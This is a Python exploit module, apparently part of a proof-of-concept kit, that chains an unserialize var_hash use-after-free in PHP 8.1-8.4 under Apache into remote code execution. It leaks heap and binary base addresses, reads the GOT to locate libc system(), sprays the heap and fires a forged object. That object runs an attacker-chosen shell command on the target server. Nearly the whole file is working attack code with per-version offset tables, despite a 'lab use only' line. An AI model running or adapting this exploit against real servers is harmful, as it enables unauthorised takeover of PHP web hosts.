#!/usr/bin/env python3
# INDEX: var_hash-uaf rce, window-free binbase | apache | pure | serialize+unserialize | build | 8.1-8.4
"""Offset-table route for the unserialize var_hash UAF -> RCE on Apache mod_php,
PHP 8.1-8.4. CVE-2026-109618 / CVE-2026-109619.

The by-name (gnu_hash) chain's libphp-base scan fails on 8.1-8.4 (page-aligned
p_align=0x1000 libphp + interior-read pathology). This module derives binbase
window-free from the ZendMM chunk header (scans the used-heap window for a
&std_object_handlers pointer by its page-offset signature, validates with an ELF
header read at the candidate base) and supplies the remaining symbol addresses
from the per-build offset table (common.offsets.BUILTIN_OFFSETS["<ver>-apache"]). Only
libc system() still needs a window read (GOT dump + libc gnu_hash). Pure stdlib,
safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import universal_remote_rce as remote_rce
import fire_8426_shim as shim

# Offset tables live in common.offsets.BUILTIN_OFFSETS (read-only import).
from common.offsets import BUILTIN_OFFSETS  # noqa: E402


LIBC_TAB = {
    # version: (GOT_FREE_SLOT in libphp [free@GLOB_DAT, non-IFUNC, eager],
    #           LIBC_FREE_OFF, LIBC_SYSTEM_OFF)  -- readelf-derived per build.
    "8.1.34": (0xeeea10, 0xa3240, 0x53110),
    "8.2.35": (0xf389a0, 0xa2fc0, 0x53090),
    "8.3.36": (0x1042940, 0xa2fc0, 0x53090),
}


def read_got_slot(binbase, slot_off):
    """Bounded read of a libphp GOT slot via the DT_PLTRELSZ fake-len window.
    Bounded length => no huge-length serialize() SIGSEGV (the pathology that
    sinks a raw pointer-slot read). Returns the resolved qword at
    binbase+slot_off, or None."""
    got, data_start = remote_rce._gotread.read_got_via_pltrelsz(remote_rce.isstring_read, binbase)
    if got is None:
        return None
    slot = binbase + slot_off
    if not (data_start <= slot < data_start + len(got) - 8):
        return None
    return struct.unpack_from("<Q", got, slot - data_start)[0]


def _offsets(version):
    key = f"{version}-apache"
    off = BUILTIN_OFFSETS.get(key)
    if off is None:
        raise SystemExit(f"no BUILTIN_OFFSETS['{key}']")
    need = ("std_object_handlers", "executor_globals",
            "zend_standard_class_def", "zif_system", "gpf_handler_off")
    for n in need:
        if n not in off:
            raise SystemExit(f"BUILTIN_OFFSETS['{key}'] missing {n}")
    return off


# binbase + ce from one chunk+0x40 read (window-free)
def derive_binbase_and_ce(chunk, soh_off, timeout=6, verbose=True):
    """Return (binbase, stdclass_ce, reqs) using ONE forged read of the ZendMM
    chunk header window. Both are derived from live `&std_object_handlers`
    image pointers in the request heap; neither needs /proc or a window scan.
    """
    r0 = remote_rce.req_count
    if verbose:
        print(f"\n[Phase R-2*] binbase via single chunk-header read "
              f"(chunk 0x{chunk:x})")
    r = remote_rce.isstring_read(chunk + 0x40, timeout=timeout)
    if r is None:
        print("  R-2* FAILED: chunk-header read returned None")
        return None, None, remote_rce.req_count - r0
    slen, data = r
    wbase = chunk + 0x40 + 0x18
    siglow = soh_off & 0xFFF
    if verbose:
        print(f"  chunk window: slen={slen} ({len(data)} bytes), "
              f"soh signature low12=0x{siglow:x}")

    # Candidate binbases from soh-signature pointers.
    votes = {}
    soh_slots = []
    for i in range(0, len(data) - 7, 8):
        p = struct.unpack_from('<Q', data, i)[0]
        if (p & 0xFFF) != siglow:
            continue
        if not (0x100000000 <= p < remote_rce.ADDR_MAX):
            continue
        cand = p - soh_off
        if cand & 0xFFF:            # must be page-aligned
            continue
        votes[cand] = votes.get(cand, 0) + 1
        soh_slots.append((i, p))
    if not votes:
        print("  R-2* FAILED: no std_object_handlers signature in window")
        return None, None, remote_rce.req_count - r0

    binbase = None
    for cand, nv in sorted(votes.items(), key=lambda kv: -kv[1]):
        if remote_rce._read_elf_header(cand) is not None:
            binbase = cand
            if verbose:
                print(f"  binbase = 0x{binbase:x}  "
                      f"(soh-signature x{nv}, ELF header validated)")
            break
    if binbase is None:
        print("  R-2* FAILED: no soh-candidate validated as an ELF base")
        return None, None, remote_rce.req_count - r0

    # stdClass ce for free: object+0x10 (one qword before the handlers slot),
    # for slots whose handlers == &std_object_handlers exactly. Prefer a
    # canonical high pointer and confirm ce->name == "stdClass".
    soh_abs = binbase + soh_off
    ce_votes = {}
    for i, p in soh_slots:
        if p != soh_abs or i < 8:
            continue
        ce = struct.unpack_from('<Q', data, i - 8)[0]
        if 0x100000000 <= ce < remote_rce.ADDR_MAX and (ce & 0xF) == 0:
            ce_votes[ce] = ce_votes.get(ce, 0) + 1
    shim.remote_rce_mod = remote_rce
    ce_out = None
    for ce, nv in sorted(ce_votes.items(), key=lambda kv: -kv[1]):
        if shim._ce_name_is_stdclass(remote_rce, ce):
            ce_out = ce
            if verbose:
                print(f"  stdClass ce = 0x{ce:x}  "
                      f"(heap-harvested x{nv}, ce->name=='stdClass')")
            break
    if ce_out is None and verbose:
        print("  (ce not harvested from window; caller may read "
              "zend_standard_class_def from .bss as a fallback)")
    return binbase, ce_out, remote_rce.req_count - r0


def ce_from_zscd(binbase, eg, zscd_off, verbose=True):
    """Fallback ce: read the zend_standard_class_def pointer from .bss (image
    read, slower -- an anchor sweep -- but lands once binbase is known)."""
    shim.remote_rce_mod = remote_rce
    zscd = binbase + zscd_off
    if verbose:
        print(f"  [ce fallback] reading *zend_standard_class_def @0x{zscd:x}")
    for _ in range(4):
        ce = shim._read_ptr_bss(remote_rce, eg, zscd)
        if ce and 0x10000 < ce < remote_rce.ADDR_MAX and shim._ce_name_is_stdclass(remote_rce, ce):
            return ce
    return None


# Chain driver
def run(host, port, path, version, cmd, system_mode="libc",
        chunk=None, attempts=8, verbose=True):
    """Drive the table-route chain. system_mode:
         'libc'   -> libc system() (the only target the get_properties_for
                     fire can actually exec); binbase/eg/ce/S/gpf window-free.
         'zif'    -> use the table zif_system in get_properties_for (empirical
                     check; does not exec -- wrong calling convention).
    """
    off = _offsets(version)
    remote_rce.HOST, remote_rce.PORT, remote_rce.PATH = host, port, path
    stats = {"req_start": remote_rce.req_count, "crash_start": remote_rce.crash_count}

    # heap pointer / chunk (remote, every SAPI).
    if chunk is None:
        heap_ref = None
        for i in range(attempts):
            heap_ref = remote_rce.heap_leak()
            if heap_ref:
                break
        if not heap_ref:
            print("  R-1 FAILED: no heap pointer leaked")
            return False, stats
        chunk = heap_ref & ~0x1FFFFF
    else:
        heap_ref = chunk | 0x57080
    print(f"\n[Phase R-1] heap_ref=0x{heap_ref:x} chunk=0x{chunk:x}")

    # binbase + ce, window-free.
    binbase, ce, _ = derive_binbase_and_ce(chunk, off["std_object_handlers"],
                                           verbose=verbose)
    if binbase is None:
        return False, stats

    # Addresses from the TABLE (no gnu_hash-by-name).
    eg = binbase + off["executor_globals"]
    zif_system = binbase + off["zif_system"]
    gpf = off["gpf_handler_off"]
    print(f"\n[Phase R-3*] from table: executor_globals=0x{eg:x} "
          f"zif_system=0x{zif_system:x} gpf=0x{gpf:x}")

    if ce is None:
        ce = ce_from_zscd(binbase, eg, off["zend_standard_class_def"],
                          verbose=verbose)
        if ce is None:
            print("  R-5 FAILED: no stdClass ce")
            return False, stats

    # system target
    if system_mode == "libc":
        print("\n[Phase R-4] libc system() via GOT TABLE (one anchored read; "
              "binbase known -> no scan, no window pathology)")
        tab = LIBC_TAB.get(version)
        if tab is None:
            print(f"  R-4 FAILED: no LIBC_TAB entry for {version}")
            return False, stats
        got_free_slot, libc_free_off, libc_system_off = tab
        free_ptr = read_got_slot(binbase, got_free_slot)
        if free_ptr is None:
            print("  R-4 FAILED: GOT free-slot read")
            return False, stats
        libc_base = free_ptr - libc_free_off
        system_addr = libc_base + libc_system_off
        print(f"  free_ptr=0x{free_ptr:x} libc_base=0x{libc_base:x} "
              f"system=0x{system_addr:x}")
    else:
        system_addr = zif_system
        print(f"\n[Phase R-4 skipped] system_mode=zif -> using table "
              f"zif_system=0x{system_addr:x} (EXPECTED to misfire)")

    # spray slot (offset-free, crash-tolerant).
    S = remote_rce.find_spray_slot(heap_ref)
    if S is None:
        print("  R-6 FAILED: no spray slot")
        return False, stats

    # fire with gpf from the table (shim builds the gpf-192 forge).
    print(f"\n[Phase R-7] fire: ce=0x{ce:x} system=0x{system_addr:x} "
          f"S=0x{S:x} gpf=0x{gpf:x}")
    fire = shim.make_fire_cmd(gpf_off=gpf, verbose=verbose)
    shim.remote_rce_mod = remote_rce
    out = fire(ce, system_addr, S, cmd if isinstance(cmd, bytes)
               else cmd.encode("latin-1"))
    ok = out is not None
    stats.update({
        "req_end": remote_rce.req_count, "crash_end": remote_rce.crash_count,
        "total_reqs": remote_rce.req_count - stats["req_start"],
        "total_crashes": remote_rce.crash_count - stats["crash_start"],
        "binbase": binbase, "chunk": chunk, "eg": eg, "ce": ce,
        "system": system_addr, "S": S, "gpf": gpf,
    })
    print(f"  in-band HTTP 200 (worker survived): {ok} "
          f"(marker verified out-of-band is the real signal)")
    return ok, stats


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--version", required=True, help="e.g. 8.2.35 / 8.3.36")
    ap.add_argument("--cmd", default="id>/dev/shm/p")
    ap.add_argument("--system", choices=["libc", "zif"], default="libc")
    ap.add_argument("--chunk", default=None)
    args = ap.parse_args(argv)
    chunk = int(args.chunk, 16) if args.chunk else None
    t0 = time.time()
    ok, stats = run(args.host, args.port, args.path, args.version,
                    args.cmd, system_mode=args.system, chunk=chunk)
    print("\n" + "=" * 60)
    print(f"[apache_route] delivered={ok} reqs={stats.get('total_reqs')} "
          f"crashes={stats.get('total_crashes')} elapsed={time.time()-t0:.1f}s")
    if ok:
        print(f"[apache_route] binbase=0x{stats['binbase']:x} "
              f"ce=0x{stats['ce']:x} system=0x{stats['system']:x}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
